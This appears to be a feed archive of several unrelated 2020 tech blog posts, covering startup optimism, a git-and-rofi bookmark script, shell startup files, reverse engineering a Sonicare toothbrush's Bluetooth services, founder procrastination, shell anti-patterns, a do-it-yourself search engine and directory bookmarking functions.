<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>What do I want the future to be like? What amazing inventions do I want to see, and help build in my lifetime? I realized this morning that I don’t know. I was shocked.</p> <p>I’ve been tinkering with technology since I was a child, and I’ve been investing in early-stage companies for the past five years. More than sixty bets on the future. I’m meant to have bold visions of a better world, theses I support, and capital that I allocate in a technologically optimistic way. I began investing in startups because I wanted to help shape the future. And while I still get excited talking to founders with bold ideas, I have none of my own.</p> <p>When I was a teen, growing up on a diet of Carl Sagan’s Cosmos and Alvin Toffler’s Futurism, I had plenty of big ideas: spaceflight, supersonic travel, mag-lev trains, geodesic domes, bio-nanotech for longevity, and social organization to provide maximum freedom for all. Cheesy, but optimistic.</p> <p>Now I am 29 and I have no big, optimistic ideas. I think of plenty of arbitrages and improvements in efficiency. And while I believe that better infrastructure enables more construction and innovation, closing an obscure pricing gap just isn’t like dreams of great adventure and exploration on the frontier of human experience and possibility.</p> <p>I spend much time thinking about solutions to existing problems – the incentive mismatch in mass media that is causing accelerating polarization, how to remedy the effects of climate change, and so on. But these are all <em>fixes</em>, reactions. It feels like I’m in the belly of the ship, frenetically plugging leaky holes, never even having the space of mind to think <em>where the ship should go</em>. Ostensibly, those decisions are made on the bridge of the ship, which, in October 2020, seems to be populated by well-intentioned individuals, but hamstrung in their ability to make good collective decisions.</p> <p>Recent years have shown me how difficult it is to make <em>any</em> meaningful public decision. Every debate is endlessly contentious, every subject has meaningful nuance, and every decision has exceedingly hard-to-predict second-order-effects. The world is much more complex than it was even twenty years ago, and the effects are paralyzing. This is clearly felt among policymakers, but I feel it even as a technologist: I understand that virtually all tools can be used – and more often than not, <em>will</em> be used – for both good and evil, and how hard the results are to predict over years in our dynamic world. I learned that technology can rarely solve fundamental social problems, and I’ve seen the public perception rollercoaster of “this technology/person/policy is good” to “this is evil” more times than I can count.</p> <p>This puts me in a real bind for having high-conviction views that aren’t microscopically focused. As an example, for the past few years I have struggled developing a long-term view on bitcoin. By network effect, I think it is clear that in the long term, we will have <em>either</em> fiat or crypto – either fully centralized or fully decentralized – not both. Which world do I want to live in? I’m not sure. On the one hand, it is clear that our existing US financial system is fragile with systemic risk, a playball exposed to potentially irresponsible governance. You might call its mechanics unfair to the masses, but you’d also need to point out that it has <em>actually worked</em> in creating prosperity over the past 110 years. (And, comparing the US to other countries, it has worked remarkably well!) I agree with need for overhaul of the system, but I’m not sure if it’s wise throw out the entire thing and open up the world’s largest power vacuum in the process. This rarely ends well. I cannot tell, with intellectual honesty, which avenue is best to pursue. I doubt that anyone does.</p> <p>Other arenas of big problems and changes yield similar dilemmas. Perhaps consequently, I have found myself not dreaming big anymore. I dream small, where the effects are predictable. On dreaming big, there is the paralysis of responsibility and effects, but there is also a level of cynicism that has come to me over the years, as big dreams turn out to be much more fraught and complicated as they move into reality. The nuance, complexity, difficulty, responsibility, and often <em>irreversibility</em> in effecting big changes has slowly removed the stars from my eyes as I look at technology. Maybe that’s a good thing as I come to appreciate the gravity of change.</p> <p>But at the same time, if we don’t take big, bold, bets, we’ll be forever stuck in the valleys of local optima. As Bezos says, the size of your risk-taking should increase with the size of your enterprise – at scale, we should be taking many daring gambles, all the time. But it doesn’t feel like that’s really happening. It feels like we spend lots of effort debating marginal nuance, sitting in the belly of the ship doing maintenance, rather than charting the course forward.</p> <p>It is difficult to be an optimist in 2020. I admire the few<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup> that still have the courage to dream big and to remind ourselves that there <em>is</em> a future that could be amazing and that is worth fighting for.</p>  <hr>  <br> </article> </div></div>]]>

<![CDATA[A simpler approach to bookmarks]]>

October 24, 2020 | https://www.samhh.com/blog/simpler-bookmarks/ | <a href="https://web.archive.org/web/*/https://www.samhh.com/blog/simpler-bookmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We all use the web, and we all use bookmarks. But did you know that you don’t have to use the bookmarking functionality built into your web browser?</p>
<p>This is why a while ago I migrated to <a href="https://github.com/jarun/buku">buku</a> and, at the time still pretty much living inside my web browser, I wrote <a href="https://github.com/samhh/bukubrow-webext">Bukubrow</a>. (I’m really creative at naming things as you can see!)</p>
<p>Any external bookmark manager is a ton better than using that which is built into your browser for one key reason - you’re no longer tied to a specific browser. Sure, you might (?) be able to import and export those bookmarks around, but it’s a hassle and not something I’d want to rely upon as browser vendors struggle to find reasons to differentiate, leaving platform lock-in increasingly tempting. I’m certain at one point it wasn’t possible at all, but I assume and hope that in the many years since things have improved.</p>
<p>You want to know something really annoying about buku? It’s written in Python. This means that, as the interpreter starts up on each <code>buku</code> invocation on the command-line, there’s a perceptible delay that isn’t present on any piece of software written in C, Rust, Go, Haskell, et cetera. (The same problem plagues JavaScript to an even worse extent.) It’s a terrible user experience. When you’re used to your terminal opening in mere milliseconds, this delay is extremely annoying. (Side note: If you’re running something like <a href="https://github.com/alacritty/alacritty">Alacritty</a> and your prompt isn’t ready virtually immediately then you’re probably using something like Oh My Zsh!, which butchers the startup time of the prompt.)</p>
<p>Something else annoying about Python is the state of its package management. People rag on JavaScript projects’ complex and slow build systems, but at least once it’s distributed the end user typically has a single bundled script to run, just as with the other languages I’ve mentioned you’d generally have a single binary. Seemingly not so with Python! Installation of buku is painful because it carries with it a bunch of dependencies I don’t care about. These are implementation details for the author, and they probably shouldn’t be updated independently on my system. Can you imagine if all software was like this? You’d barely be able to go five minutes on Arch without some sort of dependency (of a dependency of a dependency) update requiring an update. <a href="https://beets.readthedocs.io/en/stable/">beets</a>, also written in Python, as much as I love it, suffers these same issues.</p>
<p>This led me to wonder what alternatives are out there. After being broadly unsatisfied with what I found, and having spent a while really enjoying <a href="https://www.passwordstore.org/">pass</a>, I decided to roll my own solution. What started out as a vague idea to write a “simple” bookmark manager in Haskell a la pass resulted in a truly simple shell script. Introducing <a href="https://github.com/samhh/dotfiles/blob/bcb15d05274478d78b4eecb7f56dd813f15a9dbe/home/scripts/flatmarks.sh">flatmarks</a>, a script so simple it doesn’t even warrant its own project page.</p>
<p>This script depends upon only a single tool, <a href="https://github.com/davatorium/rofi">rofi</a>, something a lot of folks running Linux with tiling window managers will already be using. It could be trivially updated to use <a href="https://tools.suckless.org/dmenu/">dmenu</a> or something else that can handle the interactive aspect. All it does is recursively collect the name of every file in a specified directory, present them to the user, and open the first line of the selected file in the browser. (Okay, technically it could open other stuff too as it’s calling <code>xdg-open</code>, but I’m not sure what else you’d put here. Maybe links to <a href="https://gemini.circumlunar.space/">Gemini</a>?)</p>
<p>The bookmarks directory itself can be thought of in the same way as pass’ password repo, except it’s lacking encryption. I suppose that could be quite easily implemented as well if you felt that necessary.</p>
<p>What does this look like in practice? I have a directory <code>~/.bookmarks/</code>, managed by git and backed up to a private remote somewhere, within which I have all my bookmarks. Most of them live at the root, but some are organised inside subdirectories. If ever I delete something and want it back, it’s right there in my git history. I don’t need to do anything at all if I change web browser. When I want to open a bookmark, regardless of where I am, I open <a href="https://github.com/samhh/dotfiles/blob/0f25b2e7cf4ca26482221347afac0034fee9f921/home/xmonad-samhh/Main.hs#L273">the keybind defined in my window manager</a>, which’ll open it up in my web browser of choice, currently <a href="https://github.com/fanglingsu/vimb">vimb</a>. When I want to add a bookmark I simply pop it into the repo and, if I want to keep it around for more than just a brief period of time, I commit it.</p>
<p>It’s a little more upfront work but the end result, in my eyes, is a lot simpler. It’s more ergonomic and it’s far less hostile to customisation and change. That seems to be the tradeoff with a lot of technology, Linux on the desktop as another example. The same can be said for a lot of the other software I’ve mentioned in this post too. But it’s totally worth it.</p>
<p>For anyone still using Bukubrow, this is why there hasn’t been much activity. It’s not abandoned, but I also don’t have much impetus to work on it as I did before as I no longer use it myself. You, too, might find a bash script and a git repo to be superior to anything more proprietary anyway.</p></div></div>]]>

October 24, 2020 | https://blog.flowblok.id.au/2013-02/shell-startup-scripts.html?hn=20201024 | <a href="https://web.archive.org/web/*/https://blog.flowblok.id.au/2013-02/shell-startup-scripts.html?hn=20201024">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>Update (2020-03-29)</p>
<p>When I originally wrote this blog post, my intent was to describe how things
worked on a typical system at the time.
Unfortunately, the operation of bash startup scripts is dependent on
patches added by OS distributions, compile-time options and if bash thinks
it was invoked by sshd or rshd.
I have no desire to add complexity to this post, so instead please
read this as a rough approximation of the truth.
If you want to know for certain how it works on your system, the only answer
is <em>test it yourself</em>.</p>
</div>
<p>If you’re a regular shell user, you’ve almost certainly got a
<tt>.bash_profile</tt> or <tt>.bashrc</tt> script in your home folder,
which usually contains various tweaks, such as setting environment variables
(adding that directory to <tt>$PATH</tt>), telling your shell to do clever things
(like <tt>set <span>-o</span> noclobber</tt>) and adding various aliases to commands
(like <tt>alias please=sudo</tt>).</p>
<p>(If you’re really organised, you’ll have all your dotfiles in a repository
somewhere so that you can keep your settings synchronised across all the
machines you work on.)</p>
<p>Anyhow, I suspect that few people know when things like <tt>.bash_profile</tt> and
<tt>.bashrc</tt> actually get executed. When I started, I just followed people’s
advice of putting stuff in <tt>.bashrc</tt>, and then when it didn’t work, into
<tt>.bash_profile</tt>.
I could stop here and describe just the bash startup process (as silly as it
is), but there’s a complication in that I switched to zsh a few years ago
(and haven’t looked back), but occasionally use bash on machines which don’t
have zsh installed.</p>
<p>In order to handle this nicely then, I need to be able to specify things which
are specific to bash or zsh in their own files, and then to specify things
which any POSIX-compliant shell (like aliases and environment variables) can
understand in a common startup file.</p>
<p>My solution to this problem is to define some new dotfile folders,
one for each shell (<tt>.bash/</tt>, <tt>.zsh/</tt> and <tt>.sh/</tt>), and one for the
shell-independent files (<tt>.shell/</tt>):</p>
<div><pre><span></span>.bash/
    env
    interactive
    login
    logout
.sh/
    env
    interactive
    login
.shell/
    env
    interactive
    login
    logout
.zsh/
    env
    interactive
    login
    logout
</pre></div>
<p>“But!”, you say, <a href="#since" id="id1">[1]</a> “what do the different files in here do?”
Ah, well I’m glad you asked.
There are two kinds of shells:</p>
<ul>
<li>[non-]interactive shells (you type into them / shell scripts)</li>
<li>[non-]login shells (the shell run when you first login / subshells)</li>
</ul>
<p>All shells will first run <tt>env</tt>, then login shells will run <tt>login</tt>,
then interactive shells will run <tt>interactive</tt>.
Once finished, login shells will run <tt>logout</tt>.</p>
<div id="where-to-put-stuff">
<h2>Where to put stuff</h2>
<p>It all depends on when it needs to be run.</p>
<p>If it’s setting / modifying environment variables, it should go in <tt>login</tt>.
If it’s alias or a terminal-specific environment variable (e.g., GREP_COLOR),
it should go in <tt>interactive</tt>.
In my <tt>.shell/env</tt> file, I have my umask set, and also define some useful
functions for modifying colon-separated path environment variables (like
$PATH).</p>
<p>Even if you don’t adopt anything else from my scheme, I’d recommend you take a
look at the what my functions are doing which differs from something like
<tt>export <span>PATH=$PATH:/path/to/dir</span></tt>.</p>
<p>That particular pattern is way too common, and is very dangerous if you
consider the case when <tt>$PATH</tt> (or whatever your variable is, like
<tt>$LD_LIBRARY_PATH</tt>) isn’t set.
Then, the value will be <tt>:/path/to/dir</tt>, which usually means both
<tt>/path/to/dir</tt> <em>and the current directory</em>, which is usually both unexpected
behaviour and a security concern.</p>
<p>With my implementation (see <tt>.shell/env_functions</tt>), you can append, prepend
and remove directories from any colon-separated environment variable, and when
appending or prepending, you are guaranteed that directory will only then
appear in that variable once.</p>
<p>As a side note, I’m very disappointed in my <tt>indirect_expand()</tt> function,
so if you have a better solution, please let me know (or send me a pull request).</p>

<h2>Implementation</h2>
<p>In order to implement this, you first need an understanding of which startup
files are run in each case.
Of course, this isn’t hard, since all the shells have the same, sensible
system. Ahahaha, no.</p>
<p>Fortunately, I’ve read the man pages for you, and drawn a pretty diagram.
To read it, pick your shell, whether it's a login shell, whether it's
interactive, and follow the same colour through the diagram.
When the arrows split out to multiple files, it means that the shell will try
to read each one in turn (working left to right), and will use the first one it
can read.</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup.png"></p><p>An important point here is that if you have a non-login, non-interactive shell
running a plain POSIX shell (dash, bash in sh compatibility mode), it <em>won’t
fulfil</em> our contract in that it won’t read <tt>.sh/env</tt>
(and hence <tt>.shell/env</tt>).</p>
<p>The other special case which exists is Bash’s remote shell mode (which is
rather warped), where it tries to detect if it’s running under ssh or rsh (I
assume by looking at the process name of its parent), and if so, follows a
different path, which is indicated on the diagram.</p>
<p>Except that diagram shows what happens according to the man page, and not what
happens when you actually try it out in real life.
This second diagram more accurately captures the insanity of bash:</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup-actual.png"></p><p>See how remote interactive login shells read /etc/bash.bashrc, but normal
interactive login shells don’t? Sigh.</p>
<p>Finally, <a href="http://hg.flowblok.id.au/shell-startup">here’s a repository</a> containing my implementation and the graphviz
files for the above diagram.
If your POSIX-compliant shell isn’t listed here, or if I’ve made a horrible
mistake (or just a tiny one), please send me a pull request or make a comment
below, and I’ll update this post accordingly.</p>

            <p>Since a few month I own an electrical toothbrush from Phillips called <a href="https://www.google.com/search?q=Sonicare+HX992B">Sonicare HX992B</a>. It connects to <a href="https://play.google.com/store/apps/details?id=com.philips.cdp.ohc.tuscany" title="App">an mobile App</a> using Bluetooth that tells you how well you brushed your teeth, shows the orientation in real-time, and also notifies you when to change the brush for a new one.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-image.jpeg" alt="Phillips Sonicare"></p>
            <p>I was curious how this exactly works. Since the application uses Bluetooth Low Energy (BLE), I used the <a href="https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp">nRF Connect</a> app for Android to get a list of advertised services.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/whatsapp-image-2020-10-09-at-19-34-24.jpeg" alt="Screenshot of nRF connect" title="Screenshot of nRF connect"></p>
            <p>Now I had a list of 12 BLE services of which only four are <a href="https://www.bluetooth.com/de/specifications/gatt/" title="List of common services">standard services described on bluetooth.com</a>. In addition to well-known services like Generic Access, Generic Attribute, Device Information and Battery Service, also eight custom services exist, that were created by the manufacturer. Every one of the first seven service UUIDs starts with <code>477ea600-a260-11e4-ae37-0002a5d5000</code> and ends with a number from 1 to 8 with number 3 missing. An additional eight service has a completely different prefix than the others.</p>

            <p>By switching the device on and off, changing the strength and mode and also by changing the brush back and forth, I was able to identify some of the characteristics of the six services. By reverse engineering the code of the Android app using <a href="https://github.com/skylot/jadx">jadx</a> I found information about the session storage and many other things.</p>

            <p>According to the application sources, the last unknown service is called “Moonshine Streaming” and is used to update the firmware. I agreed with myself to not touch this one, since I could damage the firmware and would need to brush my teeth by hand again.</p>
            <p>Since I could see a very course orientation displayed in the app during a cleaning session, I expected orientation data somewhere in the characteristics. I found them in the service <code>5</code>. Once you enable notifications for the <code>4130</code> service, you get a data stream to byte arrays. It turns out, these are indeed the values of the gyroscope.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you are an indie hacker or a solo founder, you probably realize that you have to wear many hats and simultaneously juggle many balls. Building and running a successful business requires you to be a developer, a marketer, customer support, and everything else that a business may need to survive.&nbsp;<br></p><p>But let me ask you a question. Of all those hats I mentioned, which one you wear the most? Well, if you have a technical background and know-how to code -like myself-, I bet it's the developer's hat. If you are aware of this and don't mind, simply because you enjoy coding and building a profitable business is not your highest priority, you probably don't need to read the rest of this article.<br></p><p>However, if profitability&nbsp;<strong>is</strong>&nbsp;your priority, but coding still takes +90% of your time, then maybe it's worth pausing for a minute to ask yourself, why? For me, that's the case. Coding takes a big chunk of my time. I enjoy coding, and I'm good at it. So it seems like spending my time coding is a "choice", at least, this is what I thought.<br></p><p>Last week, after <a href="https://www.jamalx31.com/sunday-tldr/themed-days">implementing themed days (newsletter email)</a>, I set a deadline for myself on Saturday to post on Reddit to promote my startup, Hatchy. I procrastinated on that for two weeks by then, so I promised myself that I would post no matter what, and I won't care if the product was ready.<br></p><p>Saturday came, and I kept my promise. I posted, and I received some excellent feedback, but also some critics. That's normal; what was interesting to me is the feeling I had every time I opened Reddit or IndieHackers to check the comments. I felt sick, stressed like I'm about to go naked on stage to deliver a speech. It's my fear of public embarrassment. That bit was kind of clear to me, but what it has to do with coding? I didn't make the connection straight away, but later on I&nbsp;read this:&nbsp;<br></p><blockquote>As Voltaire once wrote, "The best is the enemy of the good."<p>I refer to this as the difference between being in motion and taking action. The two ideas sound similar, but they're not the same. When you're in motion, you're planning and strategizing and learning. Those are all good things, but they don't produce a result.</p><p>Action, on the other hand, is the type of behavior that will deliver an outcome. If I outline twenty ideas for articles I want to write, that's motion. If I actually sit down and write an article, that's action. If I search for a better diet plan and read a few books on the topic, that's motion. If I actually eat a healthy meal, that's action.</p><p>Sometimes motion is useful, but it will never produce an outcome by itself. It doesn't matter how many times you go talk to the personal trainer, that motion will never get you in shape. Only the action of working out will get the result you're looking to achieve.</p><p>If motion doesn't lead to results, why do we do it? Sometimes we do it because we actually need to plan or learn more. But more often than not, we do it because motion allows us to feel like we're making progress without running the risk of failure. Most of us are experts at avoiding criticism. It doesn't feel good to fail or to be judged publicly, so we tend to avoid situations where that might happen.&nbsp;<strong>And that's the biggest reason why you slip into motion rather than taking action: you want to delay failure.</strong>" </p><p>- Atomic Habits, James Clear</p></blockquote><p>‍</p><p>It was the "aha!" moment. Coding is my motion. It's easy to be in motion and convince yourself that you're still making progress. You keep adding new features, fixing bugs, and re-styling your landing page, thinking to yourself how much progress you made. When I fact, you are just procrastinating on all the other important stuff.&nbsp;<br></p><p>In August, Chris McCormick shared a shocking post on IndieHackers.&nbsp;<a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174" target="_blank">Only ~1% of 17,207 people who have joined Indie Hackers makes more than $2k MRR</a>. Of course, the data is not 100% accurate, but that doesn't discard that it's so hard and takes a long time for a solo founder to build a sustainable business. But maybe there is more to that than just the fact it's hard.<br></p><p>What if you are stuck on the "coding wheel"? What if it's taking so long not only because it takes time to build but also because you systematically slip into motion rather than taking action? What if you keep yourself busy coding to delay failure and, as a result, delay success?</p><p>‍</p></div></div>]]>

<p>You won't go to hell for these, but you should probably look at the manpage. Some programs are just limited, but hey, you can't expect every program to provide a printf function, a date formatter and handling of input from stdin.</p>

<h2 id="Undeclarative%20%3Ccode%3Egrep%3C/code%3E">Undeclarative <code>grep</code></h2>

<p><code>grep</code> is a true power tool in Unix, but can be abused. Here is an example (by me ðŸ˜®):</p>

<p><code>date --date="$(stat "$4/${i%\.html}.md" | grep Modify | cut -d':' -f2-</code></p>

<p>Poor old skuzzymiglet then had no idea about <code>stat --printf</code>, which has useful options for printing times:</p>

<pre><code>%w     time of file birth, human-readable; - if unknown
%W     time of file birth, seconds since Epoch; 0 if unknown
%x     time of last access, human-readable
%X     time of last access, seconds since Epoch
%y     time of last data modification, human-readable
%Y     time of last data modification, seconds since Epoch
%z     time of last status change, human-readable
%Z     time of last status change, seconds since Epoch
</code></pre>

<p>The human-readable dates are fixed-format, so you can just <code>date "your_cool_format" --date="@$(stat --printf="%Y" whatever_you_want)"</code></p>

<p>Generally, a <code>printf</code> like option is useful in programs - it discourages scraping and greatly shortens pipe sequences. But alas, most programs will need to be grepped.</p>

<h2 id="Functions">Functions</h2>

<p>It sounds weird but I believe functions are a shell code smell. The problem is that with a function, you expect paramater names (and types if you're a reasonable person ðŸ˜€). However, you'll find it's just like command-line arguments, and if you don't have the time to use <strong>getopt(1)</strong>, you'll be addressing by index.</p>

<p>Or you could just reassign to variables:</p>

<p><em>(from <a href="https://www.romanzolotarev.com/ssg.html">ssg5</a>)</em></p>

<pre><code>render_sitemap() {
    urls="$1"
    base_url="$2"
    date="$3"

    echo '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
    echo '&lt;urlset'
    echo 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
    echo 'xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9'
    echo 'http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd"'
    echo 'xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;'
    echo "$urls" |
        sed -E 's#^(.*)$#&lt;url&gt;&lt;loc&gt;'"$base_url"'/\1&lt;/loc&gt;&lt;lastmod&gt;'"$date"'&lt;/lastmod&gt;&lt;priority&gt;1.0&lt;/priority&gt;&lt;/url&gt;#'
    echo '&lt;/urlset&gt;'
}
</code></pre>

<p>But who would use this?</p>

<pre><code>func render_sitemap(params []string)
</code></pre>

<p>I consider shell function with more than one parameter a contributor to write-only code.</p>

<h2 id="Multiple%20text%20processors">Multiple text processors</h2>

<p>The text processor hierarchy follows:</p>

<ul>
<li>single-purpose: <code>cut</code>, <code>tr</code>, <code>nl</code>, <code>sort</code>, <code>grep</code></li>
<li>flat: regexes and sed</li>
<li>text DSLs: Awk</li>
<li>scripting languages: Python, Perl</li>
</ul>

<p>Generally, you should use <strong>one</strong> and only one of those specified above. Start with the lower-down tool, then instead of adding a command to the pipe use a higher-tier text processor.</p>

<p>In pipes, programming languages get out of hand quickly. Putting everything in quotes and no syntax highlighting is difficult.</p>

<p><em>This list will probably get a few updates in the future. For now, happy scripting!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="root">

<h2>Prelude</h2>
<p>I read more often than ever that people are looking for ways to build
their own search engines.</p>
<p>Even if more on more "advanced" features are integrated into search
engines.  They are mostly based on human grunt work.  Semantic search
engine, whatever "semantic" does mean for you, is in fact merely a
couple, not more than a dozen, set of tricks.  I like to say, much of
Google's search engine is good old human labor.  If you still doubt
it, here is again: Google results are not only biased, also they are
editorialized.  Whether algorithms, and their bugs, party is
irrelevant.</p>
<p>My point is: it is human made.  Not some necessarly advanced alien
tool.</p>
<p>The only thing preventing you to have your own search engine is there
is no readily available software, why? because there is no cheap
hardware.</p>
<p>This might sound like a crazy idea five or ten years ago, but with the
advent of AMD threadripper ie. <a href="http://cultureandempire.com/html/cande.html">cost gravity at
play</a> getting together a
personal search engine is, if not a necessity, at least a possibility.</p>
<p>The most common complain I read about Google is that it yields
irrelevant text "that do no even contain my search terms". That is not
a bug, that is a feature!  It seems to me the subtext is that you can
not easily customize Google or whatever search algorithm since it is
privative.  Even retrieving Google search results for further
processing if not forbidden, is at least difficult.</p>
<h2>Getting started</h2>
<p>Let's start with the beginning: what is a search engine? A search
engine is software that will <strong>crawl</strong> the Internet, <strong>index</strong>
ie. store the text in a particular format, and that users can
<strong>query</strong> and receive in return the most relevant text.</p>
<p>Let's dive into what "relevant text" means. What is relevant text?</p>
<ol>
<li>A text that contains the search term in my query</li>
<li>A text that has the same topic as my query</li>
<li>A text that gives an answer to my query</li>
</ol>
<p>The good answer is "it depends".  That's why queries have grown from
keywords match like a book index, to boolean queries e.g. <code>"Apple"
-bible</code>, until so called semantic search, which boils down to consider
one-way or two-way synonyms and other lexical features.</p>
<p>So far, I failed to build a crawler that works.  Also much of the text
I am looking for is in wikipedia or StackOverflow for which they are
flat releases which are much more easy to get started than putting
together your own crawler.  Still, they are some crawler around, so
you can use that or learn from it.  I will not dive into the crawler
part because it still hurts when I think about <code>robots.txt</code>,
throttling, text encoding etc... booooh!</p>
<p>So, we will imagine that you have a dataset of plain text, for
instance wikipedia vital articles.  It helps if you know the content
of the dataset.  Querying random news article is not very easy to
grasp because you have to read (!) the text to figure when and how
they are relevant.</p>
<p>Before querying, you need to store the text, but to know <strong>how</strong> to
store the text you need to know which query feature you want. To get
started I will only consider positive keywords and negative keywords
like <code>apple -bible</code>. So, we need to figure which find out which text
contains the word <code>apple</code> but not the word <code>bible</code>. Looking up
everything that does not contain <code>bible</code> is difficult, you would need
to <strong>scan</strong> the whole database to what are those document. Instead we
will look for documents that contains the word <code>apple</code>.  So the
following document contains the word we are looking for:</p>
<div><pre><span></span><span>(</span><span>define </span><span>doc1</span> <span>"apple is looking for a search engine."</span><span>)</span>
</pre></div>
<p>That is the moment where the most advanced technology of our current
century makes it appearance: the inverted index.  <strong>What is an inverted
index? It reverses the relationship between the document and the word</strong>.
Instead of saying "this document contains the word apple" it says
"apple is contained in this document".  So we might have a procedure
that returns the document identifier that contains <code>apple</code>, like:</p>
<div><pre><span></span><span>(</span><span>assert</span> <span>(</span><span>contains?</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>)</span> <span>1</span><span>))</span>
</pre></div>
<p><code>inverted-index-lookup</code> returns a list, and that list contains the identifier <code>1</code>
of the first document.  That list might be big. So <strong>you want to consider the least common word from the query</strong>. I call that step
<em>candidates selection</em>.  Also, you might want to convert the positive terms
into lemmas or stems to go toward semantic search, which will mean you need
to store lemmas or stems at index time.</p>
<p>Anyway, the next step, given the list of documents that contain the
least common word or term or lemma or stem, is to <strong>filter and score</strong>
according to the full query. In the above case, that is remove the
documents that contains <code>bible</code>.  You can do that step serially, and
it will necessarly take time.  The trick is to use <code>for-each-par-map</code>.
That is a cousin of map-reduce that execute the map procedure in
parallel.</p>
<p>For instance something like:</p>
<div><pre><span></span><span>(</span><span>let </span><span>((</span><span>hits</span> <span>'</span><span>()))</span>
  <span>(</span><span>for-each-par-map</span>
    <span>(</span><span>lambda </span><span>(</span><span>uid</span> <span>score</span><span>)</span> <span>(</span><span>when</span> <span>score</span> <span>(</span><span>set! </span><span>hits</span> <span>(</span><span>take</span> <span>10</span> <span>(</span><span>sort</span> <span>(</span><span>cons </span><span>(</span><span>cons </span><span>uid</span> <span>score</span><span>)</span> <span>hits</span><span>))))))</span>
    <span>score</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>))</span>
  <span>hits</span><span>)</span>
</pre></div>
<p>The score function is interesting. I think going the
<a href="https://github.com/abusix/ahocorapy">aho-corasick</a> with a
<a href="https://medium.com/analytics-vidhya/converting-boolean-logic-decision-trees-to-finite-state-machines-180ad195abf2">FSM</a>
is the best route because it is easy to implement proximity scoring,
"phrase matching", or really anything I can think of.</p>
<blockquote><p>⚠ That last paragraph is really the most important part of this
post.</p>
</blockquote>
<h2>Conclusion</h2>
<p>There is a gigantic leap that is going to happen in search because of
hardware availability, and free software with readable source ie. the
only thing that makes human progress possible: knowledge sharing.</p>

<p>A small list of methods for fast file system navigation from the command line.
While I tried all of them and finally settled on a minimal approach described at the end, the article doesn’t advocate for one method over the others.
Different users have different needs and should choose the approach most suitable in their circumstances.</p>

<h2 id="spring">Spring</h2>

<p>At the beginning, just after learning to use the command line, my terminal navigation included a lot of <code>cd</code> and a lot of <code>ls</code>.
I jumped around folders, learned shortcuts like, <code>cd ~</code>, <code>cd -</code>, and started becoming familiar with the shell.
Having multi-argument commands for quick file manipulation felt powerful and fresh, or so I remember.</p>

<p>After going to command line you no longer have to open folders in a graphical window manager, scan their names, use <code>&lt;ctrl + mouse click&gt;</code> to select them, and then drag the mouse to move those selected folders to another place.
You do <code>'mv pattern* place/'</code> instead.
All is nice.</p>

<p>But there was one problem.</p>

<h2 id="summer">Summer</h2>

<p>Along the way I started organizing my folders using a structure like this:</p>

<pre><code>└── work
    ├── bitbucket
    │   └── user1
    │       ├── repo1
    │       └── repo2
    ├── github
    │   ├── user1
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user2
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user3
    │   │   ├── repo1
    │   │   ├── repo2
    │   │   ├── repo3
    │   │   └── repo4
    │   └── user4
    │       └── repo1
    ├── teaching
    │   ├── class1
    │   │   ├── lecture1
    │   │   └── lecture2
    │   └── class2
    │       ├── lecture1
    │       └── lecture2
    ├─── clients
    │   ├── client1
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   ├── client2
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   └── client3
    │      └── project1
    └─── ...
</code></pre>

<p>I often had to go in and out of various project folders and my <code>cd</code> + <code>ls</code> navigation became tedious.
Reaching a project involved navigating a big tree of directories.
On top of that a lot of directories had similar names which got in the way of tab completion.
This is where I found “z” - a command line utility that tracks your most visited folders based on frequency and recency<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>.</p>

<p>“z” keeps a database of your most frequently used folders and allows to quickly jump to these folders even if you don’t remember their full name.
Instead of doing a lot of <code>cd</code> + <code>&lt;tab&gt;</code> all you have to do is type <code>'z proj'</code> and <code>z</code> will take you to your most frequently/recently accessed folder that has <code>proj</code> somewhere in its name.
It takes a short amount of time for “z” to learn about your most visited places but after that it becomes quick and convenient.</p>

<p>But there was one problem.</p>

<h2 id="autumn">Autumn</h2>

<p>“z” didn’t always take me where I wanted to be.
It worked, I would say, around 95% of the time or more.
But those other times it took me to an unrelated directory and distracted from the work at hand forcing to navigate my way back using the old <code>cd</code>.
Moreover, sometimes I moved and renamed various folders which likely contributed to its disorientation.</p>

<p>After this experience I decided that the terminal should be dumb and deterministic without any fuzziness or smart guessing.
And here I found <code>marks</code> - a short and sweet command line script for keeping manual directory bookmarks.<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>
It consisted of 4 tiny functions: one for creating a mark, one for removing, one for listing all the marks, and one for jumping to the bookmarked folder:</p>

<pre><code>export MARKPATH=$HOME/.marks

function mark {
  mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}

function unmark {
  rm -i "$MARKPATH/$1"
}

function marks {
  ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g' &amp;&amp; echo
}

function jump {
  cd -P "$MARKPATH/$1" 2&gt;/dev/null || echo "No such mark: $1"
}
</code></pre>

<p>As well as a function generating completion suggestions after pressing <code>&lt;tab&gt;</code>:</p>

<pre><code>_completemarks() {
  local curw=${COMP_WORDS[COMP_CWORD]}
  local wordlist=$(find $MARKPATH -type l -printf "%f\n")
